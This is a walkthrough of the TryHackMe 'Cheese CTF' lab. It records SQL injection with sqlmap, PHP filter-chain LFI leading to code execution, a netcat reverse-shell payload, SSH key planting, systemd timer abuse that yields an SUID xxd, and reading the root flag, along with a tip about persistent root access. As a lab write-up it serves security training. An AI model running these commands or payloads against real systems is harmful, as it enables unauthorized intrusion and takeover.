# Cheese CTF — TryHackMe Writeup

<img width="200" height="200" alt="image" src="https://github.com/user-attachments/assets/be0e239e-2c46-4a17-b8d4-ef1f251ba4c1" />


**Difficulty:** Easy  
**Access:** Free  
**Room Link:** https://tryhackme.com/room/cheesectfv10 

Inspired by the great Cheese talk on TryHackMe.

---

## Initial Recon — RustScan

Let's get started with port scan using rustscan for fast port discovery.

<img width="1467" height="771" alt="rust-scan result" src="https://github.com/user-attachments/assets/9ee2cb7b-23e5-44e8-a403-0d197282af8b" />

Interestingly, the server appeared to be **faking ports**, showing almost everything as open.

---

## Service Enumeration — Nmap

Ran Nmap for service enumeration — same behavior observed: multiple fake open ports.

<img width="1017" height="785" alt="namp-scan" src="https://github.com/user-attachments/assets/3ef68982-99e5-4519-bd08-86db498e97af" />


---

## Manual Port Testing

Tried common ports manually, starting with port 80.

<img width="1918" height="887" alt="80port " src="https://github.com/user-attachments/assets/26403025-fa02-4bab-a101-27d4f0869880" />

Port 80 hosted a **Cheese Shop** web application with a login page.

Attempted default credentials — failed.

At this point, SQL injection became the primary hypothesis.

---

## SQL Injection with SQLMap

Captured the login POST request using Burp Suite and saved it to a file.

<img width="863" height="366" alt="burp-req" src="https://github.com/user-attachments/assets/d989beb5-c6a1-44fe-a2de-e71e4aa903e9" />

Then executed SQLMap:


```bash
sqlmap -r request.txt --batch
```


<img width="1907" height="789" alt="sqlmap-resut" src="https://github.com/user-attachments/assets/b6092984-fce8-46bb-918a-021516794219" />

SQLMap successfully identified injection and resulted in a **302 redirect** to a hidden admin panel.

---

## LFI + PHP Filter Chain Discovery

Inside the admin panel, noticed that files were being loaded using a `file` parameter:

```
secret-script.php?file=
```

This suggested possible **Local File Inclusion (LFI)**.

<img width="1918" height="837" alt="Lfi-vuln" src="https://github.com/user-attachments/assets/24dedc85-dc07-43d7-83db-bb816cc9ea3e" />

Additionally, hovering links revealed usage of **PHP filter chains**, opening the door for Remote Code Execution.

<img width="1926" height="901" alt="Filter-link" src="https://github.com/user-attachments/assets/39450bf0-9658-4674-afde-297f6f95860f" />

---

## PHP Filter Chain RCE

it's possible to get rce using php filter chain mentioned here:

```
https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it
```

now first we need to generate a payload using this:

```bash
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your-ip> <port> >/tmp/f"); ?>' | grep '^php' > payload.txt
```

Started listener:

```bash
nc -lvnp <port>
```

Sent payload:

```bash
curl -s "http://10.48.162.171/secret-script.php?file=$(cat payload.txt)"
```

Reverse shell obtained as `www-data`.

<img width="891" height="263" alt="www-shell" src="https://github.com/user-attachments/assets/36e7b02e-23fd-4774-91b3-f188c0bd1f7e" />

---

## Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation — User Access

Searched for writable locations:

```bash
find / -writable 2>/dev/null
```

<img width="1446" height="157" alt="find-command " src="https://github.com/user-attachments/assets/f8ab8264-6ca6-4483-987a-2d918ae7a385" />

we can write to comte's ssh keys so lets generate a pair in our local machine

Generated SSH key locally:

```bash
ssh-keygen -f comte -t ed25519
```
<img width="1297" height="792" alt="ssh-keygen" src="https://github.com/user-attachments/assets/95191a9f-79a1-48c5-9acd-1cab790c7325" />

now let's copy public key to the authorized_keys on target /comte/.ssh:

<img width="1752" height="173" alt="copy_inauthkey" src="https://github.com/user-attachments/assets/aabed51a-a080-40a8-948f-67eed9626218" />

after this we can simply connect as comte using our private ssh key:

```bash
ssh comte@10.48.162.171 -i comte
```
<img width="757" height="670" alt="User-flag" src="https://github.com/user-attachments/assets/1ebc9589-24ad-4fd3-a6ca-43cbccb561db" />

User flag retrieved.

---

# Root Privilege Escalation

To get root flag let's first check user sudo permissions:

```bash
sudo -l
```
<img width="598" height="112" alt="sudo-permission" src="https://github.com/user-attachments/assets/4fc70d01-a968-4ded-9055-c1ccb2cb53ae" />

Found permission to run as root:

```
/etc/systemd/system/exploit.timer
```

---

## Analyzing exploit.timer

Content of exploit.timer:

```ini
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

let's run it and see what's happen 

<img width="1055" height="267" alt="time-error" src="https://github.com/user-attachments/assets/899dcaee-1ff2-451d-805a-850a3b6a327f" />

it throws and error which is because in exploit.timer file there is no "OnBootSec" specify
and also by checking it's status it triggers the exploit.service 

```
exploit.service
```

---

## exploit.service Content

```ini
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

This copies `xxd` into `/opt` and assigns **SUID root**.

now it make sense: we start the exploit.timer ->  which trigger exploit.service and  -> it spawn the suid binary in /opt/xxd.

---

## Fixing Timer

first set `OnBootSec` to any value:

```ini
OnBootSec=10min
```

<img width="1002" height="242" alt="set ontboot" src="https://github.com/user-attachments/assets/ec1042d2-8e0b-4db6-89a3-f9c3e0b14dae" />

now run the timer again and this time it will spawn xxd in /opt directory 

```bash
sudo systemctl start exploit.timer
```

<img width="1126" height="245" alt="xxd-spawn" src="https://github.com/user-attachments/assets/b0577faa-4b8c-485b-8c98-b8fd8595bd5b" />

---

## Exploiting SUID xxd

now to get root flag check GTFOBins for xxd binary:

Referenced GTFOBins:

```
https://gtfobins.org/gtfobins/xxd/#file-write
```

Read root flag:

```bash
/opt/./xxd /root/root.txt | xxd -r
```
<img width="952" height="268" alt="root-flag" src="https://github.com/user-attachments/assets/e5251180-de2a-4b60-9724-c0fe7d461990" />

Root flag obtained.

---

## Alternative Root Access

You can also use `xxd` to write your SSH public key into:

```
/root/.ssh/authorized_keys
```

for persistent root access.

---

# Attack Chain Summary

1. RustScan → Fake open ports detected  
2. Manual port testing → Web application discovered  
3. SQLMap → Authentication bypass  
4. LFI + PHP filter chain → Remote Code Execution  
5. Reverse shell as www-data  
6. Writable SSH directory → User access (comte)  
7. systemd timer abuse → SUID binary spawn  
8. GTFOBins on xxd → Root flag  

---

## Conclusion

This room demonstrated:

- SQL injection exploitation  
- PHP filter chain RCE  
- SSH key pivoting  
- systemd timer abuse  
- SUID binary exploitation  

Solid practice for web exploitation combined with Linux privilege escalation.

---

## Author

**Akshay Sutariya**

- TryHackMe: https://tryhackme.com/p/mrAkki  
- LinkedIn: https://www.linkedin.com/in/akshay-sutariya2404/  
